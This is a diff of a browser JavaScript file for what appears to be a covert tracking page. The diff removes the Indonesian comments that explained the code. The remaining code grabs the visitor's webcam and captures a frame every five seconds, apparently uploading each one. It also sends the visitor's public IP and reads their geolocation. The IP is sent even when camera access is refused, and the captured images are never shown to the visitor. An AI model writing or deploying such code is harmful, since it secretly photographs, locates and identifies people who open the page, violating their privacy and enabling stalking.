@@ -1,7 +1,6 @@
 const video = document.getElementById("video");
 const resultDiv = document.getElementById("result");
 
-// Fungsi untuk mengirim IP publik
 function sendIP(ip) {
     fetch("/send_ip", {
         method: "POST",
@@ -12,19 +11,16 @@ function sendIP(ip) {
     });
 }
 
-// Akses kamera dan lokasi
 navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
 
-        // Kirim IP publik
         fetch("/get_ip")
             .then(response => response.json())
             .then(data => {
                 sendIP(data.ip);
             });
 
-        // Ambil gambar secara terus menerus
         setInterval(() => {
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
@@ -43,13 +39,10 @@ navigator.mediaDevices.getUserMedia({ video: true })
             .then(response => response.json())
             .then(data => {
                 if (data.status === "success") {
-                    // Tampilkan hasil jika diinginkan
-                    // resultDiv.innerHTML += `<img src="${data.image_url}" width="300" />`;
                 }
             });
-        }, 5000); // Ambil gambar setiap 5 detik
+        }, 5000); 
 
-        // Ambil lokasi
         navigator.geolocation.getCurrentPosition(position => {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -78,7 +71,6 @@ navigator.mediaDevices.getUserMedia({ video: true })
     })
     .catch(err => {
         console.error("Error accessing camera: ", err);
-        // Jika izin kamera tidak diberikan, kirim hanya IP publik
         fetch("/get_ip")
             .then(response => response.json())
             .then(data => {
